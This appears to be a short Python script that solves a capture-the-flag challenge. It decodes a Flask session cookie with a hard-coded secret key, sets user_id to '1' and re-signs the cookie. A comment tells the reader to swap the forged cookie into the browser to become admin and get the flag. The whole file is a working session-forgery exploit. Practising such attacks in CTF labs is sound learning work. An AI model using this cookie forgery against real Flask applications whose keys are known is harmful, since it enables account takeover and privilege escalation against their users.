#!/usr/bin/env python
from flask.sessions import SecureCookieSessionInterface
from itsdangerous import URLSafeTimedSerializer

## this code was found on github, i only borrowed it to solve this challenge !
## i alsu used this website to decode the old cookie https://www.kirsle.net/wizards/flask-session.cgi
class SimpleSecureCookieSessionInterface(SecureCookieSessionInterface):
	# Override method
	# Take secret_key instead of an instance of a Flask app
	def get_signing_serializer(self, secret_key):
		if not secret_key:
			return None
		signer_kwargs = dict(
			key_derivation=self.key_derivation,
			digest_method=self.digest_method
		)
		return URLSafeTimedSerializer(secret_key, salt=self.salt,
		                              serializer=self.serializer,
		                              signer_kwargs=signer_kwargs)

def decodeFlaskCookie(secret_key, cookieValue):
	sscsi = SimpleSecureCookieSessionInterface()
	signingSerializer = sscsi.get_signing_serializer(secret_key)
	return signingSerializer.loads(cookieValue)

# Keep in mind that flask uses unicode strings for the
# dictionary keys
def encodeFlaskCookie(secret_key, cookieDict):
	sscsi = SimpleSecureCookieSessionInterface()
	signingSerializer = sscsi.get_signing_serializer(secret_key)
	return signingSerializer.dumps(cookieDict)

if __name__=='__main__':
	sk = '385c16dd09098b011d0086f9e218a0a2'
	cookie = '.eJwlj8sKAjEMAP-l5z0kTZuHP7N0kxRFUNjVk_jvLnifgZlPWeeex7VcXvs7l7LeolyKILFqEzCLsKaiat1IG0N1TsIcbjRDBtXOm0s3S2Iw2Gg7IcO-4emyDxcZCLVFh5yoxuFUHSZF19Y0HV1nShXu4OzeG1KWpfixz_X1vOfj7DFDjEhVBiLNyKEcAIKRPAhkOoinztN7H7n_J1r5_gCFDj1-.DyHgjQ.dKVNuLZ3UDBOMAGDfzUi4hV-8t8'
	decodedDict = decodeFlaskCookie(sk, cookie)
	print "[*] Old cookie --> "
	print decodedDict
	decodedDict["user_id"] = u'1'
	new_cookie = encodeFlaskCookie(sk, decodedDict)
	decoded = decodeFlaskCookie(sk, new_cookie)
	print "[*] New cookie -->"
	print decoded
	print "[*] Decoded new cookie -->"
	#copy this new_cookie and change it with your browser current value then click admin button again et Voila you are the admin and you got the flag !
	print new_cookie
